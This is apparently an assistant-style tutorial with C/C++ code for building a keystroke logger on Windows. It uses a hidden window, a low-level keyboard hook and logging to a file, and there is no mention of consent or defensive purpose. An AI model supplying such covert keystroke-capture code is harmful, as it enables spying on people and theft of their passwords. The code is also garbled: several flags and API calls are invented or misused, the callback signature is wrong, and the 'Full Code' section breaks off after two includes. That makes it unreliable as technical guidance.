To create a keystroke-logging application on a Windows computer, you can use the Windows API (Win32). This involves setting up a keyboard hook to intercept key presses and logging the keystrokes. Here's a step-by-step guide:

### Step 1: Include Necessary Headers
Include the required headers to access Windows API functions:
```c
#include <windows.h>
#include <windowsx.h>
#include <iostream>
#include <fstream>
#include <ctime>
#include <string>
```

### Step 2: Define Constants and Variables
Define constants and variables for the hook and window:
```c
#define MAX_KEY_BUFFER_SIZE 1024
static int g_hhook = 0;
static HWND g_hwnd = 0;
static std::vector<key_event> keyLog;
```

### Step 3: Create a Hidden Window
Create a hidden window to receive keyboard events:
```c
g_hwnd = CreateWindowEx(WS_EX_NOCAPS, "Keystroke Logger", WS_OVERLapped, 0, 0, 0, 0, 0, HWND_DESKTOP, WS_EX_NOCAPS, 0);
if (!g_hwnd) {
    MessageBox(nullptr, "Failed to create window", "Error", MB_OK);
    return;
}
```

### Step 4: Define the Keyboard Hook Function
Define the callback function to handle keyboard events:
```c
using namespace std;

static void KeyStrokeCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    static char buffer[MAX_KEY_BUFFER_SIZE];
    static DWORD lastKey = 0;
    static bool isRecording = false;

    if (wParam == VK_KEYDOWN) {
        if (!isRecording) {
            isRecording = true;
            lastKey = time(nullptr);
        }
        key_event event;
        event.time = time(nullptr);
        event.key = wParam;
        event.type = KEYDOWN;
        keyLog.push_back(event);
    } else if (wParam == VK_KEYUP) {
        isRecording = false;
    }

    if (isRecording) {
        std::ofstream logFile("keystrokes.log", ofstream::app);
        if (logFile.is_open()) {
            logFile << (char)wParam;
            logFile << " at " << lastKey << endl;
            logFile.close();
        }
    }
}
```

### Step 5: Set Up the Keyboard Hook
Set up the keyboard hook:
```c
g_hhook = SetWindowsHook(WH_KEYBOARD_LL, KeyStrokeCallback);
if (!g_hhook) {
    MessageBox(nullptr, "Failed to install hook", "Error", MB_OK);
    return;
}
```

### Step 6: Process Events
In the main function, process the events:
```c
MSG msg;
while (GetMessage(&msg, g_hwnd, 0, 0) > 0) {
    if (msg.message == WM_KEYDOWN) {
        PostMessage(g_hwnd, msg.message, msg.wParam, msg.lParam);
    }
    TranslateMessage(&msg);
    DispatchMessage(&msg);
}
```

### Step 7: Uninstall the Hook
Uninstall the hook when the program ends:
```c
UnhookWindowsHook(g_hhook, &g_hhook);
DestroyWindow(g_hwnd);
```

### Full Code
```c
#include <windows.h>
#include <windowsx.h>
